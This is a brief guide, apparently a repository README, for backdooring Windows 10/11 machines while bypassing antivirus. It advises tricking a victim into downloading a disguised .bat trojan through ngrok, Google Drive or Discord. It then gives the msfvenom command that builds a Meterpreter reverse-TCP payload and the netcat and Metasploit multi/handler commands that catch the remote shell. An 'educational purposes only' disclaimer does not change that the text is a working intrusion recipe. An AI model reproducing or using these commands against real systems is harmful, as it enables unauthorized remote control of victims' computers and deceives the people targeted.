# Windows 11/10 Bypass AV & Backdoor
##### Educational purposes only
##### Social Engineering required!
#### Get victim to download .bat file to their machine, i.e through ngrok server, google drive, discord, or other means.
#### Make it convincing by turning it into a trojan horse.

### Generate the payload:
#### Using meterpreter here, but feel free to play around with it.
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[YOUR_IP] LPORT=4444 -a x86 -f exe -o [FILE_NAME.exe]

# Setup your listener with nc or msfconsole. <br>
nc -lvnp 9001 <br>
or <br>
msfconsole -q <br>
msf> use multi/handler <br>
msf  exploit(handler) > set payload windows/meterpreter/reverse_tcp <br>
msf  exploit(handler) > set LHOST <Listening_IP> (for example set LHOST 192.168.5.55) <br>
msf exploit(handler) > set LPORT <Listening_Port> (for example set LPORT 4444) <br>
msf exploit(handler) > exploit <br>
